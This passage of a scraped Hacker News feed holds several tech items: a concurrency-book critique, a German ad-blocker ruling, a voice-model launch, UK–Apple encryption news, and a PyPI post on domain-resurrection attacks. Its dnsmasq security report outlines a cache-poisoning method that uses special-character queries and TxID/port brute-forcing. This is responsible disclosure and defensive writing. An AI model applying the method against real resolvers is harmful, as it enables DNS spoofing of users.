condition variable, which already needs a mutex– it over-complicates the implementation.</p><p>If you’re trying to learn how things work under the hood, the condition variable isn’t giving you what you need to know. What you need to know is the <code>futex</code>, full stop.</p><p>Also, the book doesn’t seem to opine on recursive locks. It just shows them. I think the conventional wisdom on using them in mutexes is important to understand. And, I also think it becomes a different discussion if you’re talking about other concurrency primitives.</p><p>For instance, when using reader-writer locks (RW locks), I think recursive locks are really appropriate, just incredibly hard to get right.</p><p>If you’ve never used an RW lock, they allow any number of readers to lock for reading, all at the same time. If a writer is waiting to lock, it waits for all readers to clear (and in sane implementations, new readers cannot be added with a waiting writer).</p><p>But writers, once they do get the lock, get exclusive access, so they can edit without fear of readers seeing an inconsistent state.</p><p>In concept, that’s a great primitive to use for operations like dynamic lists. If there’s no mutation happening, but there could be lots of parallel reading, reads can end up pretty cheap, because they only have to stop for writes.</p><p>Consider an API call like:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>void</span> <span>h4x0r_list_append_all_contents</span>(<span>h4x0r_list_t</span> <span>*</span>dst, <span>h4x0r_list_t</span> <span>*</span>items);
</span></span></code></pre></div><p>The idea being, we’re going to combine the two lists by copying the contents of the <code>items</code> list onto the end of the <code>dst</code> list.</p><p>Now, we clearly want to grab a write lock on <code>dst</code>. And for <code>items</code>, we definitely want a read lock on that one.</p><p>But, what if we were given that API, and wanted to double a list, by doing:</p><p>I’ve seen APIs like this, where the same item is routinely passed through a nested set of construction operations that can mix reading and mutation. So you might need reads to nest, you might need writes to nest, all for the same item, in the same chain of calls.</p><p>We’d have no problems building an API that could handle such things in a program without concurrency, as long as we anticipate the need and fix the number of items to copy in before we start.</p><p>But in a multi-threaded app, if we don’t allow nested locks, we now also have to anticipate <em>every</em> situation where it might make sense for a list to be passed multiple times, and then add code to explicitly test for it.</p><p>So it’d be great to have solid semantics for RW lock nesting. But unfortunately, the POSIX standard leaves recursive locking as undefined behavior, which means that even if a conformant library provides such recursion, you definitely should not use it.</p><p>And in practice, behavior across common implementations is not remotely consistent. There’s a good reason why this was left undefined – it’s kind of hard. Since multiple threads can hold a lock, each thread must have a separate read nesting level.</p><p>And then how do you deal with writes that might be intermingled in there? How do you keep the accounting correct, so that you don’t drop write access too early, for instance?</p><p>These problems are solvable, though (and at some point soon, I’ll share my RW lock).</p><p>But in <em>The Art Of Multiprocessor Programming</em>, I can’t find any mention of such issues, neither warning you about the semantic challenges that can surprise you, nor showing how such things might be dealt with.</p><p>It’s not a surprise, since they don’t even mention the futex. Nor do they seem to cover async runtimes, despite their popularity (perhaps a bit more excusable since they’re generally multiplexing a single thread, but it still feels too important not to cover well).</p><h2 id="rtfc">RTFC</h2><p>The full source code is available <a href="https://codeberg.org/crashoverride/mutex">on codeberg</a>.</p><h2 id="-in-conclusion-">🏁 In conclusion 🏁</h2><p>I have plenty of other problems with this book, but they’d each probably need their own rant, and I’m not going to spend the time. But in short, this isn’t a Computer Science textbook, so much as it is a <em>history book</em>.</p><p>To other CS academics writing textbooks today, whether you’re focused on theory or practice, please make sure you at least <em>acknowledge</em> the important concepts that were around when you were <strong>writing the book!</strong></p><p>And ideally, make sure you cover some content from the current millennium.</p><p>If the only significant thing indicating the book was written (or edited) recently is the copyright date, consider that you might be doing a disservice with your book.</p><p>kthxbai,</p><p>Lee T, expert waiter 💁🏻‍♂️ (with the finest threads 🧵)</p></div></article></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Critical Cache Poisoning Vulnerability in Dnsmasq (123 pts)]]></title>
            <link>https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/018288.html</link>
            <guid>44950981</guid>
            <pubDate>Tue, 19 Aug 2025 12:56:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/018288.html">https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/018288.html</a>, See on <a href="https://news.ycombinator.com/item?id=44950981">Hacker News</a></p>
<div id="readability-page-1" class="page">
   
    <b>苗发生</b> 
    <a href="mailto:dnsmasq-discuss%40lists.thekelleys.org.uk?Subject=Re%3A%20%5BDnsmasq-discuss%5D%20%5BSecurity%20Report%5D%20Critical%20Cache%20Poisoning%0A%20Vulnerability%20in%20Dnsmasq&amp;In-Reply-To=%3C417b9e32.1ec5.198c2432df6.Coremail.mfs24%40mails.tsinghua.edu.cn%3E" title="[Dnsmasq-discuss] [Security Report] Critical Cache Poisoning Vulnerability in Dnsmasq">mfs24 at mails.tsinghua.edu.cn
       </a><br>
    <i>Tue Aug 19 12:17:19 UTC 2025</i>
    <ul>
        <li>Previous message (by thread): <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/018286.html">[Dnsmasq-discuss] Lease attribution on bad network when one configured interface does not exists
</a></li>
        <li>Next message (by thread): <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/018289.html">[Dnsmasq-discuss] [Security Report] Critical Cache Poisoning Vulnerability in Dnsmasq
</a></li>
         <li> <b>Messages sorted by:</b> 
              <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/date.html#18288">[ date ]</a>
              <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/thread.html#18288">[ thread ]</a>
              <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/subject.html#18288">[ subject ]</a>
              <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/author.html#18288">[ author ]</a>
         </li>
       </ul>
    <hr>  
<!--beginarticle-->
<pre>Dear Dnsmasq Security Team,

We would like to responsibly disclose a critical cache poisoning vulnerability affecting the Dnsmasq DNS software. The issue allows attackers to inject arbitrary malicious DNS resource records and poison domain names without requiring advanced techniques, only by leveraging a single special character.

Report Summary

Vulnerability Type: Logic flaw in cache poisoning defense

Affected Software: Dnsmasq (all versions)

Severity: Critical

Exploitability: Off-path attackers can brute-force TxID and source port within an extended attack window

Attack Name:SHAR Attack (Single-character Hijack via ASCII Resolver-silence)

Success Rate: 20/20 successful attack attempts

Average Execution Time: ~9,469 seconds

Key Findings

Dnsmasq forwards queries with special characters (e.g., ~, !, *, _) to upstream recursive resolvers.

Some upstream recursive resolvers silently discard such malformed queries (no NXDomain/ServFail response).

Dnsmasq does not validate or detect this situation, and waits silently, creating a large attack window.

During this window, attackers can brute-force TxID (16-bit) and source port (16-bit) with a high probability of success (birthday paradox effect).

Security Impact

Attackers can poison any cached domain name in Dnsmasq.

Attack is feasible off-path without IP fragmentation or side-channels.

This vulnerability also amplifies known cache poisoning attacks such as SADDNS and Tudoor.

Undermines DNS security assumptions that resolver silence is benign.

Proof of Concept

We tested against a real domain (viticm.com) and demonstrated that queries containing certain crafted characters lead to upstream silence. This allowed us to reliably poison Dnsmasq caches in all trials.

Suggested Mitigation

We recommend adding:

Detection mechanisms when upstream resolvers remain silent.

Rate limiting and spoof-detection techniques, similar to those in PowerDNS.

References

RFC1034: <a href="https://datatracker.ietf.org/doc/html/rfc1034">https://datatracker.ietf.org/doc/html/rfc1034</a>

RFC2182: <a href="https://datatracker.ietf.org/doc/html/rfc2182">https://datatracker.ietf.org/doc/html/rfc2182</a>

SADDNS: <a href="https://www.saddns.net/">https://www.saddns.net/</a>

Tudoor: <a href="https://tudoor.net/">https://tudoor.net/</a>

PowerDNS Mitigation: <a href="https://docs.powerdns.com/recursor/settings.html#spoof-nearmiss-max">https://docs.powerdns.com/recursor/settings.html#spoof-nearmiss-max</a>

We believe this issue requires urgent attention due to the wide deployment of Dnsmasq. Please let us know how we can assist further with coordinated disclosure, additional PoC details, or testing.

Best regards,
Fasheng Miao (Tsinghua University)
Xiang Li (AOSP Laboratory, Nankai University)
-------------- next part --------------
An HTML attachment was scrubbed...
URL: &lt;<a href="http://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/attachments/20250819/62972ab0/attachment-0001.htm">http://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/attachments/20250819/62972ab0/attachment-0001.htm</a>&gt;
-------------- next part --------------
A non-text attachment was scrubbed...
Name: Cache Poison_Report_Dnsmasq.pdf
Type: application/pdf
Size: 105040 bytes
Desc: not available
URL: &lt;<a href="http://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/attachments/20250819/62972ab0/attachment-0001.pdf">http://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/attachments/20250819/62972ab0/attachment-0001.pdf</a>&gt;
</pre>


<!--endarticle-->
    <hr>
    <ul>
        <!--threads-->
	<li>Previous message (by thread): <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/018286.html">[Dnsmasq-discuss] Lease attribution on bad network when one configured interface does not exists
</a></li>
	<li>Next message (by thread): <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/018289.html">[Dnsmasq-discuss] [Security Report] Critical Cache Poisoning Vulnerability in Dnsmasq
</a></li>
         <li> <b>Messages sorted by:</b> 
              <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/date.html#18288">[ date ]</a>
              <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/thread.html#18288">[ thread ]</a>
              <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/subject.html#18288">[ subject ]</a>
              <a href="https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2025q3/author.html#18288">[ author ]</a>
         </li>
       </ul>

<hr>
<a href="https://lists.thekelleys.org.uk/cgi-bin/mailman/listinfo/dnsmasq-discuss">More information about the Dnsmasq-discuss
mailing list</a><br>

</div>]]></description>
        </item>
        <item>
            <title><![CDATA['Ad Blocking Is Not Piracy' Decision Overturned by Top German Court (118 pts)]]></title>
            <link>https://torrentfreak.com/ad-blocking-is-not-piracy-decision-overturned-by-top-german-court-250819/</link>
            <guid>44950695</guid>
            <pubDate>Tue, 19 Aug 2025 12:13:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://torrentfreak.com/ad-blocking-is-not-piracy-decision-overturned-by-top-german-court-250819/">https://torrentfreak.com/ad-blocking-is-not-piracy-decision-overturned-by-top-german-court-250819/</a>, See on <a href="https://news.ycombinator.com/item?id=44950695">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <p><picture loading="lazy" decoding="async">
<source type="image/webp" srcset="https://torrentfreak.com/images/abp-springer.png.webp 265w" sizes="auto, (max-width: 265px) 100vw, 265px">
<img loading="lazy" decoding="async" src="https://torrentfreak.com/images/abp-springer.png" alt="abp-springer" width="265" height="266" srcset="https://torrentfreak.com/images/abp-springer.png 265w, https://torrentfreak.com/images/abp-springer-150x150.png 150w" sizes="auto, (max-width: 265px) 100vw, 265px">
</picture>
There’s little doubt that online businesses reliant on advertising revenue are negatively affected by increasing use of ad blocking solutions.</p>
<p>Yet it’s thanks to abusive and invasive ads, and threats to privacy due to incessant online tracking, that ad blockers became so popular. </p>
<p>There’s a good argument today that an effective ad blocking solution is not just a way to keep out an avalanche of mostly unwanted advertising. In many cases ad blockers are seen as an essential tool in the internet user’s security toolbox and as a result, people are reluctant to turn them off.</p>
<h2>Axel Springer Acquires Target, Misses, Switches to New Weapon</h2>
<p>For German publisher Axel Springer, ad blocking solutions are mechanisms that fundamentally undermine the company’s ability to generate revenue. Hoping to force change, over a decade ago the company took legal action against Eyeo GmbH, the company behind <a href="https://adblockplus.org/">Adblock Plus</a>, arguing that the software interfered with its business model. In April 2018, Adblock Plus and Eyeo came out on top, when Germany’s Supreme Court found no breach of competition law. </p>
<p>Still determined to take ad blocking out of the game, Springer changed tack. In a new lawsuit, the publisher alleged that AdBlock Plus  removes ads by interfering with the “programming code of websites” which violates its exclusive rights under copyright law. </p>
<p>Eyeo dismissed the claim as “almost absurd” and in January 2022 the Hamburg Regional Court denied Springer’s request for an injunction, ruling that there was no unauthorized copying or reworking of copyrighted computer programs as defined under local law. </p>
<p>Springer appealed and in 2023 <a href="https://juris.bundesgerichtshof.de/cgi-bin/rechtsprechung/document.py?Gericht=bgh&amp;Art=en&amp;az=IV%20ZR%20131/23&amp;nr=137405">lost again</a>, this time at the Higher Regional Court of Hamburg. Refusing to accept defeat, the publisher filed yet another appeal at the <a href="https://www.bundesgerichtshof.de/SharedDocs/Pressemitteilungen/DE/2024/2024107.html">Federal Court of Justice</a> (BGH).</p>
<h2>Treatment of Software Under German Copyright Law</h2>
<p>While competition law may have been a dead end, copyright law can offer novel opportunities for the determined.</p>
<p>Axel Springer’s argument is built on provisions in German copyright law for the protection of software. According to <a href="https://dejure.org/gesetze/UrhG/69a.html">§ 69a para. 3 UrhG</a>, a piece of software (‘computer program’) is afforded protection under copyright law if it “represents an individual work to the extent that it is the result of the author’s own intellectual creation.” </p>
<p>Protection applies to “all forms of expression” in the program but does not extend to “ideas and principles” underlying its elements. This effectively means that people can’t copy or distribute a piece of software verbatim, but they are free to write their own version of the software as long as there’s no direct copying of the original.</p>
<p>In more general terms, computer programs are treated as literary works under the Copyright Act and as such enjoy the same protection. This means that the author of a computer program (or their employer) holds exclusive rights to reproduce, distribute and make the program publicly available, just as an author of a book would.</p>
<h2>Springer Argues Websites Are Computer Programs</h2>
<p>Axel Springer argues that the software used to create its online media presence (i.e its website) qualifies for protection as software under <a href="https://dejure.org/gesetze/UrhG/69a.html">§ 69a (1) and (2)</a> of the Copyright Act.</p>
<center><em>§ 69a – Definition of software (German Copyright Act)</em><img loading="lazy" decoding="async" src="https://torrentfreak.com/images/DE-Copyright-Act-s69a.png" alt="DE Copyright Act s69a" width="670" height="238" srcset="https://torrentfreak.com/images/DE-Copyright-Act-s69a.png 1402w, https://torrentfreak.com/images/DE-Copyright-Act-s69a-300x106.png 300w, https://torrentfreak.com/images/DE-Copyright-Act-s69a-600x213.png 600w, https://torrentfreak.com/images/DE-Copyright-Act-s69a-150x53.png 150w" sizes="auto, (max-width: 670px) 100vw, 670px"></center>
<p>Based on the assumption that its software does indeed qualify for protection under § 69a, Axel Springer notes that further protection is afforded under § 69c, with certain exclusive rights granted to the rightsholder. </p>
<p>Under § 69c, third parties must obtain permission for any of the following acts:</p>
<center><em>§ 69c – Exclusive rights for qualifying software under § 69a (German Copyright Act)</em><img loading="lazy" decoding="async" src="https://torrentfreak.com/images/DE-Copyright-Act-s69c.png" alt="DE Copyright Act s69c" width="670" height="298" srcset="https://torrentfreak.com/images/DE-Copyright-Act-s69c.png 1409w, https://torrentfreak.com/images/DE-Copyright-Act-s69c-300x133.png 300w, https://torrentfreak.com/images/DE-Copyright-Act-s69c-600x267.png 600w, https://torrentfreak.com/images/DE-Copyright-Act-s69c-150x67.png 150w" sizes="auto, (max-width: 670px) 100vw, 670px"></center>
<blockquote><p><em>§ 69c (2) “the translation, adaptation, arrangement and other modifications of a computer program as well as the reproduction of the results obtained.”</em></p></blockquote>
<p>Axel Springer’s argument is that when Adblock Plus blocks or manipulates its website code (‘computer program’) present in the user’s browser, that amounts to a violation of its exclusive right of modification available under § 69c (2) and its reproduction right under § 69c (1).</p>
<h2>Federal Court of Justice Overturns Decision of Lower Court</h2>
<p>The above matters and others focused on the technical issues are detailed in the ruling handed down by the Federal Court of Justice (BGH). The ruling (<a href="http://juris.bundesgerichtshof.de/cgi-bin/rechtsprechung/document.py?Gericht=bgh&amp;Art=en&amp;client=12&amp;pos=0&amp;anz=1&amp;Blank=1.pdf&amp;nr=142511">Werbeblocker IV / Ad Blocker IV</a>) is clearly a setback for Eyeo GmbH; the Higher Regional Court of Hamburg previously ruled in favor of the Cologne-based company, a decision the BGH has just overturned.</p>
<p>In a nutshell, the BGH states that the Hamburg court arrived at its decision without first establishing important fundamentals. These details may support the decision of the Hamburg court or undermine it, but that can only be determined once the facts are established.</p>
<blockquote><p><em>“When examining whether an infringement of a copyrighted right to a protected object (here: a computer program within the meaning of Section 69a (1) of the Copyright Act) has occurred, it is not always necessary to determine whether this protected object meets the requirements of a copyrighted work, computer program, or related right. Rather, this circumstance can be assumed, provided that there is no unlawful infringement of copyright,” the decision reads.</em></p><em>
</em><p><em>“It should be noted, however, that the question of an infringement of a property right may depend on a clear definition of the protected object and its features justifying protection. Denying an infringement of a copyright-protected right while simultaneously assuming that the protected object in question is eligible for copyright protection is therefore only possible in such a case if the object itself deemed to be protected by copyright and the features justifying its protection are clearly defined.”</em></p></blockquote>
<h2>Technical Matters</h2>
<p>Lubberger Lehment, the law firm acting for Axel Springer, highlights a technical aspect mentioned in the BGH decision which it believes warrants much closer attention. </p>
<p>“In particular, the Higher Regional Court did not sufficiently consider Axel Springer’s argument that a browser is a virtual machine controlled by a website program as byte code. In its reasoning, the Federal Supreme Court quotes in unusual detail what we presented with the help of external experts,” their statement reads.</p>
<p>The decision notes that this is not just about “changing variable data in the memory of a computer, but rather changing code created by the bytecode of the website ‘computer program’ as a form of expression of the website programming itself.”</p>
<p>For those interested in the technical argument, full details are available in the decision <em>(<a href="https://juris.bundesgerichtshof.de/cgi-bin/rechtsprechung/document.py?Gericht=bgh&amp;Art=en&amp;client=12&amp;pos=0&amp;anz=1&amp;Blank=1.pdf&amp;nr=142511">pdf</a>, German)</em>. Which elements will make or break the case, if any, is still unclear.</p>
<h2>Outcome Could Have Far-Reaching Implications</h2>
<p>The scale of the fallout from an Axel Springer win could be significant and given the background, hard to balance in the bigger picture. Switching to copyright law purely because competition law proved insufficient, suggests that copyright may have been viewed as a means to an end. Whether wider disruption will find balance in the benefits claimed by the plaintiffs is another question.</p>
<p>Lubberger Lehment state that the case isn’t just about protecting the integrity of online media.</p>
<p>“It is about the question of whether at all and in what quality online journalism can be offered and used in the future – it is about freedom of information without paywalls. This is fundamental to democracy,” the company writes.</p>
<p>Whether the developer community will come to view the following in a positive light remains to be seen.</p>
<p><em>“[T]he case is of fundamental importance for the entire software industry. This is because all browser applications work with the same technical components, namely HTML5, CSS, PHP, and Java Script. This affects all cloud-based applications such as computer games, standard software, SAP, etc. The ad blocker trial will determine whether this future technology is protected by copyright or can be manipulated at will by third parties.”</em></p>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Launch HN: Uplift (YC S25) – Voice models for under-served languages (101 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=44950661</link>
            <guid>44950661</guid>
            <pubDate>Tue, 19 Aug 2025 12:10:09 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=44950661">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td colspan="2"></td><td><div><p>Hi HN, we are Zaid, Muhammad and Hammad, the co-founders of Uplift AI (<a href="https://upliftai.org/">https://upliftai.org</a>). We build models that speak underserved languages — today: Urdu, Sindhi, and Balochi.</p><p>A billion people worldwide can't read. In countries like Pakistan – the 5th most populous country – 42% of adults are illiterate. This holds back the entire economy: patients can't read medical reports, parents can't help with homework, banks can't go fully digital, farmers can't research best practices, and people memorize smartphone app button sequences. Voice AI interfaces can fix all of this, and we think this will perhaps be one of the great benefits of modern AI.</p><p>Right now, existing voice models barely work for these languages, and big tech is moving slowly.</p><p>Uplift AI was originally a side project to make datasets for translation and voice models. For us it was a "cool side-thing" to work on, not an "important full-time thing" to work on. With some initial data we hacked together a Urdu Voice Bot on Whatsapp and gave it to one domestic worker. In two days 800 people were using it. When we dived deeper into understanding the users, we learned that text interfaces don't work for sooo many. So we started Uplift AI to solve this problem fulltime.</p><p>The most challenging part is that all the building blocks needed for great voice models are broken for these languages. For example, if you are creating a speech synthesis model, you will scrape a lot of data from youtube and auto-label it using a transcription model… all very easy to do in English. But it doesn't work in under-served languages because the transcription modes are not accurate.</p><p>There are many other challenges. Like when you hire human transcribers to label the data, often they don't have any spell correctors for their languages, and this creates lots of noise in the data… making it hard to train models with low data.  There are many more challenges in phonemes, silence detection, diacritization etc.</p><p>We solve these problems by making great internal tooling to help with data labeling. Also, we source our own data and don't buy it. This is counterintuitive, but a big advantage over companies buying data and then training. By sourcing our own data we create the right data distributions and get much better models with much less data.  By doing the entire thing inhouse, (data, labeling, training, deploying) we are able to make a lot faster progress.</p><p>Today we publicly offer a text to speech APIs for Urdu, Sindhi, and Balochi. Here's a video which shows this: <a href="https://www.loom.com/share/dcd5020967444c228e9c127151e7a9f5" rel="nofollow">https://www.loom.com/share/dcd5020967444c228e9c127151e7a9f5</a>.</p><p>Khan Academy is using our tech to dub videos to Urdu (<a href="https://ur.khanacademy.org/" rel="nofollow">https://ur.khanacademy.org</a>).</p><p>Our models excel at informational use cases (like AI bots) but need more work in emotive use-cases like poetry.</p><p>We have been giving a lot of people private access in beta mode, and today are launching our models publicly. We believe this will be the fastest way for us to learn about areas that are not performing well so we can fix them quickly.</p><p>We'd love to hear from all of you, especially around your experiences with under-served languages (not just the Pakistani ones we're starting with) and your comments in general.</p></div></td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[UK drops demand for backdoor into Apple encryption (268 pts)]]></title>
            <link>https://www.theverge.com/news/761240/uk-apple-us-encryption-back-door-demands-dropped</link>
            <guid>44950600</guid>
            <pubDate>Tue, 19 Aug 2025 11:58:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/news/761240/uk-apple-us-encryption-back-door-demands-dropped">https://www.theverge.com/news/761240/uk-apple-us-encryption-back-door-demands-dropped</a>, See on <a href="https://news.ycombinator.com/item?id=44950600">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p><a href="https://www.theverge.com/authors/jess-weatherbed"><img alt="Jess Weatherbed" data-chromatic="ignore" loading="lazy" width="36" height="36" decoding="async" data-nimg="1" srcset="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/195820/JESSICA_WEATHERBED.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=48 1x, https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/195820/JESSICA_WEATHERBED.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=96 2x" src="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/195820/JESSICA_WEATHERBED.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=96"></a></p><div><p><span aria-expanded="false" aria-haspopup="true" role="button" tabindex="0"><span id="follow-author-standard_article_details-dmcyOmF1dGhvclByb2ZpbGU6OTU="><span><span><svg width="9" height="9" viewBox="0 0 9 9" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Follow"><path d="M5 0H4V4H0V5H4V9H5V5H9V4H5V0Z"></path></svg></span></span><span>Jess Weatherbed</span></span></span></p> <p><span>is a news writer focused on creative industries, computing, and internet culture. Jess started her career at TechRadar, covering news and hardware reviews.</span></p></div></div><div id="zephr-anchor"><p>The United Kingdom will no longer force Apple to provide backdoor access to secure user data protected by the company’s iCloud encryption service, according to US Director of National Intelligence Tulsi Gabbard.</p><p>“Over the past few months, I’ve been working closely with our partners in the UK, alongside @POTUS and @VP, to ensure Americans’ private data remains private and our Constitutional rights and civil liberties are protected,” <a href="https://x.com/DNIGabbard/status/1957623737232007638">Gabbard posted to X on Monday</a>. “As a result, the UK has agreed to drop its mandate for Apple to provide a ‘back door’ that would have enabled access to the protected encrypted data of American citizens and encroached on our civil liberties.”</p><p>This announcement follows the UK <a href="https://www.theverge.com/news/608145/apple-uk-icloud-encrypted-backups-spying-snoopers-charter">issuing a secret order</a> in January this year, demanding Apple provide it with backdoor access to encrypted files uploaded by users worldwide. In response, Apple pulled the ability for new users in the UK to sign up to its <a href="https://www.theverge.com/news/617273/apple-removes-encryption-advanced-data-protection-adp-uk-spying-backdoor">Advanced Data Protection</a> (ADP) encrypted iCloud storage offering, and challenged the order, winning the right to publicly discuss the case in April. Earlier this year, US officials started examining whether the UK order had violated the bilateral CLOUD Act agreement, which bars the UK and US from issuing demands for each other’s data.</p><p>This pressure from the US <a href="https://www.theverge.com/news/710504/uk-apple-encryption-back-door-icloud-adp-backing-down">sparked reports last month</a> that Britain would walk back the demands it issued to Apple, with one unnamed UK official telling the <em>Financial Times</em> that the UK “had its back against the wall,” and was looking for a way out. While it’s unclear if the UK would negotiate new terms with Apple that avoid implicating the data of US citizens, an unnamed US official told <a href="https://www.ft.com/content/ab0aba27-81e0-4ee5-bcbb-6bce85386e40"><em>The Financial Times</em></a> that such negotiations would not be faithful to the new agreement.</p><p>With the order now reportedly removed, it’s unclear if Apple will restore access to its ADP service in the UK. We have reached out to Apple for comment. The UK Home Office has refused to comment on the situation.</p><div><p><span><strong>Follow topics and authors</strong> from this story to see more like this in your personalized homepage feed and to receive email updates.</span></p><ul><li id="follow-author-article_footer-dmcyOmF1dGhvclByb2ZpbGU6OTU="><span aria-expanded="false" aria-haspopup="true" role="button" tabindex="0"><span><span><svg width="9" height="9" viewBox="0 0 9 9" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Follow"><path d="M5 0H4V4H0V5H4V9H5V5H9V4H5V0Z"></path></svg></span><span>Jess Weatherbed</span></span></span></li><li></li><li></li><li></li><li></li><li></li></ul></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[PyPI Preventing Domain Resurrection Attacks (118 pts)]]></title>
            <link>https://blog.pypi.org/posts/2025-08-18-preventing-domain-resurrections/</link>
            <guid>44950091</guid>
            <pubDate>Tue, 19 Aug 2025 10:32:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.pypi.org/posts/2025-08-18-preventing-domain-resurrections/">https://blog.pypi.org/posts/2025-08-18-preventing-domain-resurrections/</a>, See on <a href="https://news.ycombinator.com/item?id=44950091">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-md-component="container">
      
      
        
          
        
      
      <main data-md-component="main">
        <div data-md-component="content">
    
    <article>
      
        
  


  <nav>
    
      
      
      
        <a href="https://blog.pypi.org/tags/#tag:security">security</a>
      
    
  </nav>


  
  


  

<h2 id="summary">Summary</h2>
<p>PyPI now checks for expired domains to prevent domain resurrection attacks,
a type of supply-chain attack where someone buys an expired domain
and uses it to take over PyPI accounts through password resets.</p>
<p>These changes improve PyPI's overall account security posture,
making it harder for attackers to exploit expired domain names
to gain unauthorized access to accounts.</p>
<!-- more -->

<p>Since early June 2025, PyPI has unverified over 1,800 email addresses
when their associated domains entered expiration phases.
This isn't a perfect solution, but it closes off a significant attack vector
where the majority of interactions would appear completely legitimate.</p>
<h2 id="background">Background</h2>
<p>PyPI user accounts are linked to email addresses.
Email addresses are tied to domain names;
domain names can expire if unpaid, and someone else can purchase them.</p>
<p>During PyPI account registration, <a href="https://policies.python.org/pypi.org/Terms-of-Service/#2-required-information">users are required to verify their email addresses</a>
by clicking a link sent to the email address provided during registration.
This verification ensures the address is valid and accessible to the user,
and may be used to send important account-related information,
such as password reset requests, or for PyPI Admins to use to contact the user.</p>
<p>PyPI considers the account holder's initially verified email address a strong indicator of account ownership.
Coupled with a form of Two-Factor Authentication (2FA), this helps to further secure the account.</p>
<p>Once expired, an attacker could register the expired domain, set up an email server,
issue a password reset request, and gain access to accounts associated with that domain name.</p>
<p>Accounts with any activity after <a href="https://blog.pypi.org/posts/2024-01-01-2fa-enforced/">January 1 2024 will have 2FA enabled</a>,
and an attacker would need to have either the second factor,
or perform a full account recovery.</p>
<p>For older accounts prior to the 2FA requirement date,
having an email address domain expire could lead to account takeover,
which is what we're attempting to prevent,
as well as minimize potential exposure if an email domain <em>does</em> expire and change hands,
regardless of whether the account has 2FA enabled.</p>
<p>This is not an imaginary attack - this has happened at least once for <a href="https://osv.dev/vulnerability/PYSEC-2022-199">a PyPI project</a> back in 2022,
and <a href="https://blog.illustria.io/illustria-discovers-account-takeover-vulnerability-in-a-popular-package-affecting-1000-8aaaf61ebfc4">other package ecosystems</a>.</p>
<p><strong>TL;DR: If a domain expires, don't consider email addresses associated with it verified any more.</strong></p>
<h2 id="domain-expiration-timeframe">Domain Expiration Timeframe</h2>
<p>Here's a generalized flowchart of phases that domain name registrars often adhere to.
There's typically a grace period before a domain is deleted.
Read more about <a href="https://www.icann.org/resources/pages/registrant-about-errp-2018-12-07-en">ICANN's Expired Registration Recovery Policy (ERRP)</a>.</p>
<p>One way to visualize this can be seen in the below flowchart:</p>
<pre><code>flowchart TD
  A[Domain Active] --&gt;|Expiration Date Reached| B{Owner Renews?}

  B --&gt;|Yes - Within Grace Period| A
  B --&gt;|No| C[Renewal Grace Period&lt;br/&gt;0-45 days]

  C --&gt;|Owner Renews&lt;br/&gt;Regular Price| A
  C --&gt;|No Renewal| D[Redemption Period&lt;br/&gt;30 days]

  D --&gt;|Owner Redeems&lt;br/&gt;High Fee $70-200+| A
  D --&gt;|No Redemption| E[Pending Delete&lt;br/&gt;5 days]

  E --&gt;|Automatic| F[Domain Released]</code></pre>
<p>The word "expiration" might be a bit overloaded,
as conceptually there is no specific state advertised that a domain name has expired,
rather using other indicators we can infer what state the domain name is currently in.</p>
<p>Thanks to our friends at <a href="https://domainr.com/">Domainr</a> (a Fastly service),
we can use their <a href="https://domainr.com/docs/api/v2/status#status-results">Status API</a>
to issue periodic queries for any given domain, and act on the response.</p>
<p>The time interval we've chosen for now is 30 days, as per the flow above,
there's a high likelihood that a domain is still in the Renewal Grace Period
or Redemption Period when we check for status,
and can react before it is released or changes hands.</p>
<p><em>Note</em>: PyPI will not detect a non-expiring domain transfer,
as we assume the parties are acting together to transfer a domain legitimately.</p>
<h2 id="pypi-actions">PyPI Actions</h2>
<p>After an initial bulk check period that took place in April 2025,
PyPI will check daily for any domains in use for status changes,
and update its internal database with the most recent status.</p>
<p>If a domain registration enters the redemption period,
that's an indicator to PyPI that the previously verified email destinations may not be trusted,
and will un-verify a previously-verified email address.
PyPI will not issue a password reset request to addresses that have become unverified.</p>
